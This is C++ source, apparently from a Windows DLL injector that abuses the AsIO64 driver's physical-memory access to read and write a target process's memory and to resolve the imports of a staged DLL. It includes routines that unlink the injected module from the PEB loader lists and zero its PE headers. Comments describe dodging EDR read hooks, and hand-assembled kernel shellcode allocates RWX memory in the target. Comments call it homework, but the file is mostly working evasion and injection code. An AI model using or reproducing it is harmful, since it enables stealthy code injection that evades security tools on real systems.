// this is not a silver bullet — pair with --rwx-cleanup once that exists.
static bool ScrubInjectedHeaders(AsioProvider& kernel, uint64_t cr3,
                                 uint64_t remoteBase, size_t imageSize) {
    if (!remoteBase || imageSize < 0x40) return false;
    const size_t scrubLen = (imageSize < 0x400) ? imageSize : 0x400;
    std::vector<uint8_t> zeros(scrubLen, 0);
    return WriteTargetMem(kernel, cr3, remoteBase, zeros.data(), scrubLen);
}

// =====================  Phase 2: target PEB / Ldr walk  =====================
//
// Replaces R3 EnumProcessModulesEx + ReadProcessMemory in the import-
// resolution path. Walks the target's PEB->Ldr->InLoadOrderModuleList
// using only reads through the target's CR3 (which we already drive via
// AsIO64's physical-memory IOCTL). A rogue R0 hook on
// NtQueryInformationProcess(ProcessBasicInformation) / NtReadVirtualMemory
// never sees the lookup.
//
// Offsets are stable for Win10/11 x64. PEB position inside EPROCESS does
// drift between Windows builds, so we auto-discover that offset by
// self-introspection at first use.

constexpr uint64_t kPebLdrOffset           = 0x18;  // PEB.Ldr
constexpr uint64_t kPebLdrInLoadOrderHead  = 0x10;  // PEB_LDR_DATA.InLoadOrderModuleList (LIST_ENTRY)
constexpr uint64_t kLdrEntryDllBaseOffset  = 0x30;
constexpr uint64_t kLdrEntrySizeOfImageOffset = 0x40;
constexpr uint64_t kLdrEntryBaseNameOffset = 0x58;  // UNICODE_STRING BaseDllName
// LDR_DATA_TABLE_ENTRY linked-list field offsets (Win10/11 x64).
//   +0x00 InLoadOrderLinks       LIST_ENTRY
//   +0x10 InMemoryOrderLinks     LIST_ENTRY
//   +0x20 InInitializationOrderLinks LIST_ENTRY
//   +0x80 HashLinks              LIST_ENTRY  (offset validated against
//                                              public _LDR_DATA_TABLE_ENTRY
//                                              symbol on Win10 1809+ and
//                                              Win11; layout unchanged through
//                                              26200. If a future build shifts
//                                              this, the unlink for HashLinks
//                                              will write garbage — guarded
//                                              with sanity check on Flink/Blink
//                                              pointer alignment.)
constexpr uint64_t kLdrEntryInLoadOrderLinks      = 0x00;
constexpr uint64_t kLdrEntryInMemoryOrderLinks    = 0x10;
constexpr uint64_t kLdrEntryInInitOrderLinks      = 0x20;
constexpr uint64_t kLdrEntryHashLinksOffset       = 0x80;

// Self-introspect to find EPROCESS.Peb's byte offset:
//   1) Grab our own PEB VA from TEB.ProcessEnvironmentBlock (gs:[0x60] on x64).
//   2) PsLookup our own EPROCESS.
//   3) Scan a window of EPROCESS bytes for the matching pointer.
// Result is cached so we only pay the discovery cost once per run.
static uint64_t DiscoverEprocessPebOffset(AsioProvider& kernel) {
    static uint64_t cached = 0;
    if (cached) return cached;

    // Read our own PEB directly from gs:[0x60] (TEB.ProcessEnvironmentBlock).
    // Going through the winnt.h struct definition can break if that header
    // lags the actual TEB layout — the gs offset has been stable for a
    // decade and is what the kernel itself uses.
    const uint64_t selfPeb = __readgsqword(0x60);
    if (!selfPeb) {
        std::wcerr << L"[-] gs:[0x60] returned 0 — cannot identify self PEB" << std::endl;
        return 0;
    }

    const uint64_t selfEprocess = ResolveTargetEprocess(kernel, GetCurrentProcessId());
    if (!selfEprocess) return 0;

    // Sweep a wide window — EPROCESS on Win11 26200 is around 0xC00 bytes
    // and historical PEB offsets cluster between 0x338 and 0x6C8.
    constexpr uint64_t kSweepLo = 0x200;
    constexpr uint64_t kSweepHi = 0xC00;
    for (uint64_t off = kSweepLo; off <= kSweepHi; off += 8) {
        uint64_t value = 0;
        if (kernel.ReadKernelMemory(selfEprocess + off, &value, sizeof(value)) && value == selfPeb) {
            cached = off;
            std::wcout << L"[+] Auto-detected EPROCESS.Peb offset: 0x"
                       << std::hex << off << std::dec << std::endl;
            return off;
        }
    }

    // Diagnostic dump: print the values at every historically-known PEB
    // offset so the student can compare against selfPeb manually.
    std::wcerr << L"[-] Could not auto-detect EPROCESS.Peb offset" << std::endl;
    std::wcerr << L"    selfPeb     = 0x" << std::hex << selfPeb << std::endl;
    std::wcerr << L"    selfEproc   = 0x" << selfEprocess << std::dec << std::endl;
    static const uint64_t kCommonOffsets[] = {
        0x288, 0x338, 0x3C8, 0x420, 0x4D0, 0x540, 0x550, 0x558,
        0x5B8, 0x648, 0x6C8, 0x758, 0x7B0, 0x848, 0x950,
    };
    for (uint64_t off : kCommonOffsets) {
        uint64_t value = 0;
        const bool ok = kernel.ReadKernelMemory(selfEprocess + off, &value, sizeof(value));
        std::wcerr << L"    +0x" << std::hex << off << L"  "
                   << (ok ? L"" : L"(read failed) ")
                   << L"0x" << value
                   << (value == selfPeb ? L"  <-- MATCH" : L"")
                   << std::dec << std::endl;
    }
    return 0;
}

// Read target's PEB virtual address.
static uint64_t ReadTargetPeb(AsioProvider& kernel, uint64_t eprocess) {
    const uint64_t off = DiscoverEprocessPebOffset(kernel);
    if (!off || !eprocess) return 0;
    uint64_t pebVa = 0;
    if (!kernel.ReadKernelMemory(eprocess + off, &pebVa, sizeof(pebVa))) return 0;
    return pebVa;
}

static uint64_t QueryTargetImageSize(AsioProvider& kernel, uint64_t cr3, uint64_t base, uint64_t eprocess = 0);

// Forward decl for the MDL-backed fallback read (defined further below).
static bool ReadTargetMemViaMdl(AsioProvider& kernel, uint64_t eprocess, uint64_t cr3,
                                uint64_t va, void* outBuffer, size_t size);

// Thread-local target eprocess hint, used by the PEB-walk reads so that
// when a Ldr-list page has been trimmed/paged-out we can fall back to a
// safe MDL probe without touching every caller in the import chain. The
// thread_local + RAII scope struct are declared earlier in the file
// (before StageRemoteDll). Set it via TargetEprocessScope before
// invoking PEB-walking helpers.

// Read through target CR3 first; on failure, if a target eprocess is in
// scope and the page is lockable, retry via single-page-chunked MDL. The
// 1 MiB cap matches ReadTargetMemViaMdl; PEB-walk reads are all small
// (<= 0x80 bytes), so chunking is essentially a single iteration.
static bool ReadTargetMemPreferMdl(AsioProvider& kernel, uint64_t cr3,
                                   uint64_t va, void* buf, size_t len) {
    if (ReadTargetMem(kernel, cr3, va, buf, len)) return true;
    const uint64_t eproc = t_pebWalkEprocess;
    if (!eproc) return false;
    constexpr size_t kPage = 0x1000;
    auto* out = static_cast<uint8_t*>(buf);
    size_t done = 0;
    while (done < len) {
        const uint64_t pageOffset = (va + done) & (kPage - 1);
        const size_t chunk = std::min<size_t>(len - done, kPage - pageOffset);
        if (!ReadTargetMemViaMdl(kernel, eproc, cr3, va + done, out + done, chunk)) {
            return false;
        }
        done += chunk;
    }
    return true;
}

// Find a loaded module's base in the target by name (case-insensitive).
// Walk PEB->Ldr->InLoadOrderModuleList. All reads go through target CR3.
static uint64_t ResolveTargetModuleBase(AsioProvider& kernel, uint64_t cr3,
                                        uint64_t peb, const std::string& dllName) {
    if (!peb || dllName.empty()) return 0;

    uint64_t ldrVa = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, peb + kPebLdrOffset, &ldrVa, sizeof(ldrVa)) || !ldrVa) {
        return 0;
    }

    const uint64_t listHead = ldrVa + kPebLdrInLoadOrderHead;
    uint64_t flink = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, listHead, &flink, sizeof(flink)) || !flink) {
        return 0;
    }

    // Convert needle to wide for compare with BaseDllName (UNICODE_STRING).
    std::wstring needle;
    needle.reserve(dllName.size());
    for (char c : dllName) needle.push_back(static_cast<wchar_t>(c));

    constexpr int kMaxModules = 1024;
    for (int i = 0; i < kMaxModules; ++i) {
        if (flink == listHead) break;
        const uint64_t entry = flink;  // InLoadOrderLinks lives at offset 0 of the entry.

        struct {
            uint16_t Length;
            uint16_t MaxLength;
            uint32_t Pad;
            uint64_t Buffer;
        } baseName{};
        static_assert(sizeof(baseName) == 16, "UNICODE_STRING x64 must be 16 bytes");

        if (ReadTargetMemPreferMdl(kernel, cr3, entry + kLdrEntryBaseNameOffset, &baseName, sizeof(baseName)) &&
            baseName.Length && baseName.Length < 1024 && baseName.Buffer) {
            std::wstring name(baseName.Length / sizeof(wchar_t), L'\0');
            if (ReadTargetMemPreferMdl(kernel, cr3, baseName.Buffer, name.data(), baseName.Length) &&
                _wcsicmp(name.c_str(), needle.c_str()) == 0) {
                uint64_t base = 0;
                if (ReadTargetMemPreferMdl(kernel, cr3, entry + kLdrEntryDllBaseOffset, &base, sizeof(base))) {
                    return base;
                }
            }
        }

        // Advance via InLoadOrderLinks.Flink (offset 0 of the entry).
        uint64_t next = 0;
        if (!ReadTargetMemPreferMdl(kernel, cr3, flink, &next, sizeof(next)) || !next || next == flink) {
            break;
        }
        flink = next;
    }
    return 0;
}

static std::string WideToUtf8(const std::wstring& value) {
    if (value.empty()) {
        return {};
    }
    const int needed = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), nullptr, 0, nullptr, nullptr);
    if (needed <= 0) {
        return {};
    }
    std::string result(static_cast<size_t>(needed), '\0');
    const int written = WideCharToMultiByte(CP_UTF8, 0, value.c_str(), static_cast<int>(value.size()), result.data(), needed, nullptr, nullptr);
    if (written <= 0) {
        return {};
    }
    result.resize(static_cast<size_t>(written));
    return result;
}

struct TargetUserModule {
    std::string Name;
    uint64_t Base = 0;
    uint64_t Size = 0;
};

static bool EnumerateUserModulesToolhelp(DWORD pid, std::vector<TargetUserModule>& out) {
    out.clear();
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap == INVALID_HANDLE_VALUE) {
        return false;
    }

    MODULEENTRY32W me{};
    me.dwSize = sizeof(me);
    if (Module32FirstW(snap, &me)) {
        do {
            out.push_back({ WideToUtf8(me.szModule), static_cast<uint64_t>(reinterpret_cast<uintptr_t>(me.modBaseAddr)), static_cast<uint64_t>(me.modBaseSize) });
        } while (Module32NextW(snap, &me));
    }
    CloseHandle(snap);
    return !out.empty();
}

static bool EnumerateTargetUserModules(AsioProvider& kernel, uint64_t cr3,
                                       uint64_t peb, std::vector<TargetUserModule>& out) {
    out.clear();
    if (!peb || !cr3) return false;

    uint64_t ldrVa = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, peb + kPebLdrOffset, &ldrVa, sizeof(ldrVa)) || !ldrVa) {
        std::wcout << L"[!] ENUM_MODULES failed: could not read PEB.Ldr" << std::endl;
        return false;
    }

    const uint64_t listHead = ldrVa + kPebLdrInLoadOrderHead;
    uint64_t flink = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, listHead, &flink, sizeof(flink)) || !flink) {
        std::wcout << L"[!] ENUM_MODULES failed: could not read InLoadOrderModuleList head" << std::endl;
        return false;
    }

    constexpr int kMaxModules = 1024;
    for (int i = 0; i < kMaxModules; ++i) {
        if (flink == listHead) {
            std::wcout << L"[*] ENUM_MODULES reached list head again after " << i << L" entries" << std::endl;
            break;
        }

        const uint64_t entry = flink;
        uint64_t next = 0;
        if (!ReadTargetMemPreferMdl(kernel, cr3, flink, &next, sizeof(next)) || !next || next == flink) {
            std::wcout << L"[!] ENUM_MODULES broke while advancing list at index " << i << std::endl;
            break;
        }

        struct {
            uint16_t Length;
            uint16_t MaxLength;
            uint32_t Pad;
            uint64_t Buffer;
        } baseName{};
        static_assert(sizeof(baseName) == 16, "UNICODE_STRING x64 must be 16 bytes");

        uint64_t base = 0;
        if (!ReadTargetMemPreferMdl(kernel, cr3, entry + kLdrEntryDllBaseOffset, &base, sizeof(base)) || !base) {
            std::wcout << L"[!] ENUM_MODULES skip[" << i << L"]: no base" << std::endl;
            flink = next;
            continue;
        }

        uint32_t ldrSize = 0;
        ReadTargetMemPreferMdl(kernel, cr3, entry + kLdrEntrySizeOfImageOffset, &ldrSize, sizeof(ldrSize));

        std::wstring wideName;
        if (ReadTargetMemPreferMdl(kernel, cr3, entry + kLdrEntryBaseNameOffset, &baseName, sizeof(baseName)) &&
            baseName.Length && baseName.Length < 1024 && baseName.Buffer) {
            wideName.resize(baseName.Length / sizeof(wchar_t), L'\0');
            if (!ReadTargetMemPreferMdl(kernel, cr3, baseName.Buffer, wideName.data(), baseName.Length)) {
                wideName.clear();
            }
        }

        uint64_t size = ldrSize;
        if (size == 0) {
            size = QueryTargetImageSize(kernel, cr3, base, t_pebWalkEprocess);
        }
        std::wcout << L"[*] ENUM_MODULES candidate[" << i << L"] base=0x" << std::hex << base
                   << L" size=0x" << size << std::dec
                   << L" name_len=" << wideName.size()
                   << (wideName.empty() ? L" name=<empty>" : (L" name=" + wideName))
                   << std::endl;
        if (!wideName.empty() && size != 0) {
            out.push_back({ WideToUtf8(wideName), base, size });
        }

        flink = next;
    }

    std::wcout << L"[*] ENUM_MODULES final count=" << out.size() << std::endl;
    return !out.empty();
}

// HidePebLdrEntry — locate the LDR_DATA_TABLE_ENTRY in the target's PEB.Ldr
// whose DllBase matches `moduleBase` and unlink it from all four loader
// linked lists:
//   1. InLoadOrderLinks       (entry + 0x00)
//   2. InMemoryOrderLinks     (entry + 0x10)
//   3. InInitializationOrderLinks (entry + 0x20)
//   4. HashLinks              (entry + 0x80)  — Win10/11 x64 layout
//
// Each unlink performs the classic doubly-linked-list removal:
//   prev->Flink = next;
//   next->Blink = prev;
// then turns the entry's own LIST_ENTRY into a self-loop so re-walking
// from that node can't expose the original neighbours.
//
// All reads use ReadTargetMemPreferMdl (MDL-preferred to dodge demand-zero
// trim races and EDR ntreadvm hooks). Writes use WriteTargetMem (CR3-direct
// physical) — the LDR pages have been touched by ntdll's loader so they
// are already present; demand-zero is not a concern.
static bool HidePebLdrEntry(AsioProvider& kernel, uint64_t eprocess, uint64_t cr3,
                            uint64_t peb, uint64_t moduleBase) {
    if (!cr3 || !peb || !moduleBase) return false;

    uint64_t ldrVa = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, peb + kPebLdrOffset, &ldrVa, sizeof(ldrVa)) || !ldrVa) {
        std::wcout << L"[!] HidePebLdrEntry: could not read PEB.Ldr" << std::endl;
        return false;
    }

    const uint64_t listHead = ldrVa + kPebLdrInLoadOrderHead;
    uint64_t flink = 0;
    if (!ReadTargetMemPreferMdl(kernel, cr3, listHead, &flink, sizeof(flink)) || !flink) {
        std::wcout << L"[!] HidePebLdrEntry: could not read InLoadOrderModuleList head" << std::endl;
        return false;
    }

    // Locate the target entry by DllBase match.
    uint64_t entry = 0;
    constexpr int kMaxModules = 1024;
    for (int i = 0; i < kMaxModules && flink && flink != listHead; ++i) {
        const uint64_t candidate = flink;  // InLoadOrderLinks is at offset 0.
        uint64_t base = 0;
        if (ReadTargetMemPreferMdl(kernel, cr3, candidate + kLdrEntryDllBaseOffset,
                                   &base, sizeof(base)) && base == moduleBase) {
            entry = candidate;
            break;
        }
        uint64_t next = 0;
        if (!ReadTargetMemPreferMdl(kernel, cr3, candidate, &next, sizeof(next)) ||
            !next || next == candidate) break;
        flink = next;
    }

    if (!entry) {
        std::wcout << L"[!] HidePebLdrEntry: no LDR entry with DllBase=0x"
                   << std::hex << moduleBase << std::dec << std::endl;
        return false;
    }

    auto unlinkOne = [&](uint64_t linkVa, const wchar_t* tag) -> bool {
        uint64_t f = 0, b = 0;
        if (!ReadTargetMemPreferMdl(kernel, cr3, linkVa + 0, &f, sizeof(f)) ||
            !ReadTargetMemPreferMdl(kernel, cr3, linkVa + 8, &b, sizeof(b))) {
            std::wcout << L"[!] HidePebLdrEntry: read " << tag << L" link failed" << std::endl;
            return false;
        }
        // Sanity check: pointers must be 8-byte aligned and non-null.
        // If HashLinks offset is wrong on a future build, f/b will be
        // garbage (often unaligned). Refuse to write in that case.
        if (!f || !b || (f & 7) || (b & 7)) {
            std::wcout << L"[!] HidePebLdrEntry: " << tag
                       << L" sanity check failed f=0x" << std::hex << f
                       << L" b=0x" << b << std::dec << L" — skipping" << std::endl;
            return false;
        }
        // prev->Flink = next
        if (!WriteTargetMem(kernel, cr3, b + 0, &f, sizeof(f))) {
            std::wcout << L"[!] HidePebLdrEntry: write prev->Flink failed for " << tag << std::endl;
            return false;
        }
        // next->Blink = prev
        if (!WriteTargetMem(kernel, cr3, f + 8, &b, sizeof(b))) {
            std::wcout << L"[!] HidePebLdrEntry: write next->Blink failed for " << tag << std::endl;
            return false;
        }
        // Self-loop the entry's own list node so a re-walk starting from
        // it stops immediately without leaking neighbours.
        WriteTargetMem(kernel, cr3, linkVa + 0, &linkVa, sizeof(linkVa));
        WriteTargetMem(kernel, cr3, linkVa + 8, &linkVa, sizeof(linkVa));
        return true;
    };

    const bool a = unlinkOne(entry + kLdrEntryInLoadOrderLinks,   L"InLoadOrderLinks");
    const bool b = unlinkOne(entry + kLdrEntryInMemoryOrderLinks, L"InMemoryOrderLinks");
    const bool c = unlinkOne(entry + kLdrEntryInInitOrderLinks,   L"InInitOrderLinks");
    const bool d = unlinkOne(entry + kLdrEntryHashLinksOffset,    L"HashLinks");

    std::wcout << L"[+] HidePebLdrEntry entry=0x" << std::hex << entry
               << L" base=0x" << moduleBase << std::dec
               << L" InLoad=" << (a ? L"Y" : L"N")
               << L" InMem=" << (b ? L"Y" : L"N")
               << L" InInit=" << (c ? L"Y" : L"N")
               << L" Hash=" << (d ? L"Y" : L"N") << std::endl;
    return a || b || c || d;
}

// Detect api-ms-win-* / ext-ms-win-* virtual module names. These are
// virtual DLLs whose names get resolved through ntdll's ApiSetSchema at
// LoadLibrary time — they never appear as entries in PEB.Ldr.
static bool IsApiSetName(const std::string& name) {
    return (_strnicmp(name.c_str(), "api-ms-", 7) == 0 ||
            _strnicmp(name.c_str(), "ext-ms-", 7) == 0);
}

// Forward decl: ResolveExportFromKnownHosts and ResolveTargetExport call
// each other mutually for api-set fallback.
static uint64_t ResolveTargetExport(AsioProvider& kernel, uint64_t cr3,
                                    uint64_t peb, uint64_t moduleBase,
                                    const std::string& functionName, int depth = 0);
static bool BuildTargetExportCache(AsioProvider& kernel, uint64_t cr3,
                                   uint64_t moduleBase,
                                   CachedTargetModuleExports& out) {
    const auto it = g_targetExportCache.find(moduleBase);
    if (it != g_targetExportCache.end() && it->second.Cr3 == cr3) {
        out = it->second;
        return true;
    }

    out = {};
    out.ModuleBase = moduleBase;
    out.Cr3 = cr3;

    IMAGE_DOS_HEADER dos{};
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }
    IMAGE_NT_HEADERS64 nt{};
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }

    const auto& dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!dir.VirtualAddress || !dir.Size || dir.Size > (1u << 20)) return false;
    out.ExportDirRva = dir.VirtualAddress;
    out.ExportDirSize = dir.Size;

    IMAGE_EXPORT_DIRECTORY exp{};
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + dir.VirtualAddress, &exp, sizeof(exp))) {
        return false;
    }
    if (!exp.NumberOfNames || !exp.NumberOfFunctions || !exp.AddressOfNames || !exp.AddressOfNameOrdinals || !exp.AddressOfFunctions) {
        return false;
    }

    std::vector<DWORD> names(exp.NumberOfNames);
    std::vector<WORD> ords(exp.NumberOfNames);
    std::vector<DWORD> funcs(exp.NumberOfFunctions);
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + exp.AddressOfNames, names.data(), names.size() * sizeof(DWORD))) {
        return false;
    }
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + exp.AddressOfNameOrdinals, ords.data(), ords.size() * sizeof(WORD))) {
        return false;
    }
    if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + exp.AddressOfFunctions, funcs.data(), funcs.size() * sizeof(DWORD))) {
        return false;
    }

    auto readNameFromTarget = [&](DWORD rva, char* buf, size_t bufSize) -> bool {
        if (!rva || !buf || bufSize < 2) return false;
        memset(buf, 0, bufSize);
        if (!ReadTargetMemPreferMdl(kernel, cr3, moduleBase + rva, buf, bufSize - 1)) {
            return false;
        }
        buf[bufSize - 1] = 0;
        return true;
    };

    out.Exports.reserve(exp.NumberOfNames);
    for (DWORD i = 0; i < exp.NumberOfNames; ++i) {
        char nmBuf[512] = {};
        if (!readNameFromTarget(names[i], nmBuf, sizeof(nmBuf))) continue;
        const WORD ord = ords[i];
        if (ord >= exp.NumberOfFunctions) continue;
        const DWORD rva = funcs[ord];

        CachedTargetExport item{};
        item.Name = nmBuf;
        if (rva >= dir.VirtualAddress && rva < dir.VirtualAddress + dir.Size) {
            char fwdBuf[512] = {};
            if (!readNameFromTarget(rva, fwdBuf, sizeof(fwdBuf))) continue;
            item.IsForward = true;
            item.ForwardTarget = fwdBuf;
        } else {
            item.Address = moduleBase + rva;
        }
        out.Exports.push_back(std::move(item));
    }
    if (!out.Exports.empty()) {
        g_targetExportCache[moduleBase] = out;
    }
    return !out.Exports.empty();
}

static const CachedTargetExport* FindCachedTargetExport(const CachedTargetModuleExports& cache,
                                                        const std::string& functionName) {
    for (const auto& item : cache.Exports) {
        if (_stricmp(item.Name.c_str(), functionName.c_str()) == 0) {
            return &item;
        }
    }
    return nullptr;
}


// Brute-force resolve a function name by trying known host DLLs in order.
// Rather than parsing ntdll's ApiSetSchema (which changes layout across
// Windows builds), we just try the ranked list — ntdll and kernelbase
// host >90% of api-ms-win-core-* exports; ucrtbase hosts every
// api-ms-win-crt-*; the rest catches the long tail.
static uint64_t ResolveExportFromKnownHosts(AsioProvider& kernel, uint64_t cr3,
                                            uint64_t peb,
                                            const std::string& functionName,
                                            int depth) {
    static const char* kHosts[] = {
        "ntdll.dll",
        "kernelbase.dll",
        "ucrtbase.dll",
        "kernel32.dll",
        "user32.dll",
        "gdi32.dll",
        "advapi32.dll",
        "sechost.dll",
        "ws2_32.dll",
        "bcryptprimitives.dll",
        "combase.dll",
        "msvcrt.dll",
        "ole32.dll",
        "shell32.dll",
        "msvcp_win.dll",
        "win32u.dll",
    };
    for (const char* host : kHosts) {
        const uint64_t base = ResolveTargetModuleBase(kernel, cr3, peb, host);
        if (!base) continue;
        const uint64_t addr = ResolveTargetExport(kernel, cr3, peb, base,
                                                  functionName, depth + 1);
        if (addr) return addr;
    }
    return 0;
}

// Resolve a named export inside a module that lives in target user memory.
// Recursively chases forwarded exports ("Module.Function").
static uint64_t ResolveTargetExport(AsioProvider& kernel, uint64_t cr3,
                                    uint64_t peb, uint64_t moduleBase,
                                    const std::string& functionName, int depth) {
    if (!moduleBase || depth > 8) return 0;

    CachedTargetModuleExports cache{};
    if (!BuildTargetExportCache(kernel, cr3, moduleBase, cache)) {
        return 0;
    }

    const CachedTargetExport* item = FindCachedTargetExport(cache, functionName);
    if (!item) {
        return 0;
    }

    if (!item->IsForward) {
        return item->Address;
    }

    const std::string& forward = item->ForwardTarget;
    size_t dot = forward.find('.');
    if (dot == std::string::npos) return 0;
    std::string targetMod = forward.substr(0, dot) + ".dll";
    std::string targetFn = forward.substr(dot + 1);
    if (targetFn.empty() || targetFn[0] == '#') return 0;

    const uint64_t targetBase = ResolveTargetModuleBase(kernel, cr3, peb, targetMod);
    if (targetBase) {
        const uint64_t addr = ResolveTargetExport(kernel, cr3, peb, targetBase, targetFn, depth + 1);
        if (addr) {
            return addr;
        }
    }

    const uint64_t hostAddr = ResolveExportFromKnownHosts(kernel, cr3, peb, targetFn, depth + 1);
    if (hostAddr) {
        return hostAddr;
    }

    std::cerr << "[-] Forwarded export "
              << functionName << " -> " << forward
              << " could not be resolved" << std::endl;
    return 0;
}

// Iterate the local DLL's import table and patch each IAT entry with the
// resolved address inside the target process. The IAT is part of the local
// staging buffer; once StageRemoteDll writes localImage out via WriteTarget-
// Mem, the target sees a fully-resolved IAT and DllMain can call into
// user32/kernel32/... normally when the APC dispatches.
static bool ResolveImportsViaTargetCr3(AsioProvider& kernel, uint64_t cr3,
                                       uint64_t peb, void* localImage) {
    g_targetExportCache.clear();
    const auto imports = GetImports(localImage);
    std::cout << "[*] Resolving imports via target CR3: modules=" << imports.size() << std::endl;
    for (const auto& imp : imports) {
        std::cout << "[*] Import module: " << imp.ModuleName << " funcs=" << imp.Functions.size() << std::endl;
        uint64_t moduleBase = ResolveTargetModuleBase(kernel, cr3, peb, imp.ModuleName);

        const bool isApiSet = IsApiSetName(imp.ModuleName);
        if (!moduleBase && !isApiSet) {
            std::cerr << "[-] Target process missing dependency: " << imp.ModuleName << std::endl;
            return false;
        }
        if (moduleBase) {
            std::cout << "[+] Import module base: " << imp.ModuleName << " @ 0x" << std::hex << moduleBase << std::dec << std::endl;
        }

        size_t resolvedCount = 0;
        for (const auto& fn : imp.Functions) {
            if (fn.ByOrdinal) {
                std::cerr << "[-] Ordinal import unsupported: " << imp.ModuleName
                          << " #" << fn.Ordinal << std::endl;
                return false;
            }

            uint64_t addr = 0;
            if (moduleBase) {
                addr = ResolveTargetExport(kernel, cr3, peb, moduleBase, fn.Name, 0);
            }
            if (!addr) {
                addr = ResolveExportFromKnownHosts(kernel, cr3, peb, fn.Name, 0);
            }
            if (!addr) {
                std::cerr << "[-] Failed to resolve target export " << fn.Name
                          << " from " << imp.ModuleName << std::endl;
                return false;
            }
            *fn.Address = addr;
            ++resolvedCount;
            if (resolvedCount <= 3 || (resolvedCount % 16) == 0 || resolvedCount == imp.Functions.size()) {
                std::cout << "[+] Resolved " << imp.ModuleName << "!" << fn.Name
                          << " -> 0x" << std::hex << addr << std::dec
                          << " (" << resolvedCount << "/" << imp.Functions.size() << ")" << std::endl;
            }
        }
    }
    return true;
}



#pragma pack(push, 8)
struct R0AllocCmd {
    uint64_t Eprocess;
    uint64_t Size;
    uint32_t Protect;
    uint32_t Pad0;
    uint64_t BaseAddress;
    int32_t  Status;
    uint32_t Pad1;
    uint64_t FnKeStackAttach;
    uint64_t FnZwAllocateVirtualMemory;
    uint64_t FnKeUnstackDetachProcess;
    uint8_t  ApcState[0x30];
};
#pragma pack(pop)
static_assert(sizeof(R0AllocCmd) == 0x70, "R0AllocCmd must be 0x70 bytes");

static const uint8_t kAllocatorShellcode[] = {
    // 0x00 push rbx ; sub rsp, 0x40 ; mov rbx, rcx
    0x53,
    0x48, 0x83, 0xEC, 0x40,
    0x48, 0x89, 0xCB,

    // 0x08 KeStackAttachProcess(cmd->Eprocess, &cmd->ApcState)
    0x48, 0x8B, 0x0B,                                // mov rcx, [rbx]            ; cmd->Eprocess
    0x48, 0x8D, 0x53, 0x40,                          // lea rdx, [rbx+0x40]       ; &ApcState
    0x48, 0x8B, 0x43, 0x28,                          // mov rax, [rbx+0x28]       ; FnKeStackAttach
    0xFF, 0xD0,                                      // call rax

    // 0x15 ZwAllocateVirtualMemory(NtCurrentProcess(-1), &cmd->BaseAddress, 0, &cmd->Size, 0x3000, cmd->Protect)
    0x48, 0xC7, 0xC1, 0xFF, 0xFF, 0xFF, 0xFF,        // mov rcx, -1
    0x48, 0x8D, 0x53, 0x18,                          // lea rdx, [rbx+0x18]       ; &BaseAddress
    0x4D, 0x31, 0xC0,                                // xor r8, r8                ; ZeroBits = 0
    0x4C, 0x8D, 0x4B, 0x08,                          // lea r9, [rbx+0x08]        ; &Size
    0xC7, 0x44, 0x24, 0x20, 0x00, 0x30, 0x00, 0x00,  // mov dword [rsp+0x20], 0x3000  (MEM_COMMIT|MEM_RESERVE)
    0x8B, 0x43, 0x10,                                // mov eax, [rbx+0x10]       ; Protect
    0x89, 0x44, 0x24, 0x28,                          // mov [rsp+0x28], eax
    0x48, 0x8B, 0x43, 0x30,                          // mov rax, [rbx+0x30]       ; FnZwAllocateVirtualMemory
    0xFF, 0xD0,                                      // call rax

    // 0x3C cmd->Status = eax
    0x89, 0x43, 0x20,                                // mov [rbx+0x20], eax

    // 0x3F if (status < 0) goto skip_touch
    0x85, 0xC0,                                      // test eax, eax
    0x78, 0x21,                                      // 0x41 js skip_touch (+0x21 → 0x64)

    // 0x43 r10 = BaseAddress, r11 = Size (volatile regs, no save needed)
    0x4C, 0x8B, 0x53, 0x18,                          // mov r10, [rbx+0x18]
    0x4C, 0x8B, 0x5B, 0x08,                          // mov r11, [rbx+0x08]

    // 0x4B touch_loop:
    0x4D, 0x85, 0xDB,                                // test r11, r11
    0x74, 0x14,                                      // 0x4E jz touch_done (+0x14 → 0x64)
    0x41, 0xC6, 0x02, 0x00,                          // mov byte [r10], 0
    0x49, 0x81, 0xC2, 0x00, 0x10, 0x00, 0x00,        // add r10, 0x1000
    0x49, 0x81, 0xEB, 0x00, 0x10, 0x00, 0x00,        // sub r11, 0x1000
    0xEB, 0xE7,                                      // 0x62 jmp touch_loop (back -0x19 → 0x4B)

    // 0x64 KeUnstackDetachProcess(&cmd->ApcState)
    0x48, 0x8D, 0x4B, 0x40,                          // lea rcx, [rbx+0x40]
    0x48, 0x8B, 0x43, 0x38,                          // mov rax, [rbx+0x38]       ; FnKeUnstackDetachProcess
    0xFF, 0xD0,                                      // call rax

    // 0x6E return cmd->Status in eax
    0x8B, 0x43, 0x20,                                // mov eax, [rbx+0x20]

    // 0x71 epilogue: add rsp,0x40 ; pop rbx ; ret
    0x48, 0x83, 0xC4, 0x40,
    0x5B,
    0xC3,
};
static_assert(sizeof(kAllocatorShellcode) == 119, "Shellcode size drifted");

// Allocate `size` bytes of user-mode memory in the target process from R0.
// Returns the user VA, or 0 on failure. Memory is RWX so we don't need a
// follow-up NtProtectVirtualMemory pass.
//
// The shellcode + cmd struct are intentionally leaked into kernel pool —
// freeing them right after the call would also work (the syscall has
// returned by the time CallKernelFunction returns) but introduces a window
// where another caller could race with us, and at homework scale the leak
// is harmless.
static uint64_t AllocateTargetUserMem(AsioProvider& kernel, uint64_t eprocess,
                                      size_t size, uint32_t protect) {
    if (!eprocess || !size) return 0;

    const uint64_t ntoskrnl = kernel.NtoskrnlBase();
